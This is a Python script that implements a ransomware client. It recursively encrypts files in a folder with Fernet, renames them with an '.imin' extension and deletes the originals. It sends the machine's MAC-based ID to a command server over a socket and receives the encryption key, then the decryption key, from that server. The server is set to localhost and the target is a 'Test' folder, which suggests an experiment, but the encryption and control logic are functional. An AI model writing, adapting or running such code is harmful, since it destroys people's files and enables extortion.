import os
from pathlib import Path
from cryptography.fernet import Fernet
import socket
import select
import sys
from threading import *
import uuid

#import interface

def recursiveScan(baseDir):
    # scan current directory
    for entry in os.scandir(baseDir):
        if entry.is_file():
            # is file
            yield entry
        else:
            # if folder, start a new scan of contents
            yield from recursiveScan(entry.path)


def encrypt(file, key):
    f = Fernet(key)

    with open(file, 'rb') as fl:
        original = fl.read()
    
    encrypted = f.encrypt(original)

    filename = str(file) + '.imin'
    encFile = Path(filename)
    with open(encFile, 'wb+') as fl:
        fl.write(encrypted)
    os.remove(file)


def decrypt(file, key):
    f = Fernet(key)

    with open(file, 'rb') as fl:
        encrypted = fl.read()
    
    decrypted = f.decrypt(encrypted)

    filename = str(file).split('.imin')[0]

    decFile = Path(filename)

    with open(decFile, 'wb+') as fl:
        fl.write(decrypted)

def encryptFiles(key):
    exclude = ['.py','.pem', '.exe', '.imin']
    for item in recursiveScan(os.getcwd() + '\Test'): 
        filePath = Path(item)
        extension = filePath.suffix.lower()

        if extension in exclude:
            continue
        encrypt(filePath, key)
        print('Encrypted ' + str(filePath))

def decryptFiles(key):
    for item in recursiveScan(os.getcwd() + '\Test'): 
        filePath = Path(item)
        extension = filePath.suffix.lower()

        if extension == '.imin':
            decrypt(filePath, key)

# way to ID
MESSAGE = hex(uuid.getnode())
hex(uuid.getnode())

HOST = 'localhost'
PORT = 5789

BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print('Connected!')
s.send(bytes(MESSAGE, "utf-8"))

while True:

    read_sockets, write_sockets, error_sockets = select.select([s], [], [])

    #key = encrypt
    #wait = decryptpytho
    for sock in read_sockets:
        if sock == s:
            data = s.recv(4096)
            if not data:
                print('\nDisconnected from server')
                sys.exit()
            
            else:
                key = data.decode()
                # this will be the string "wait" in the future, telling the system not to encrypt
                if data.decode() != 'wait':
                    encryptFiles(key)
                

                #t1 = Thread(target=interface.App().pop_up_win)
               # t1.daemon = True
                #t1.start()

                # wait for a signal to begin decryption
                print('Thread worked!!!')
                
                # recv waits for new input of key to decrypt
                key = s.recv(4096)
                decryptFiles(key)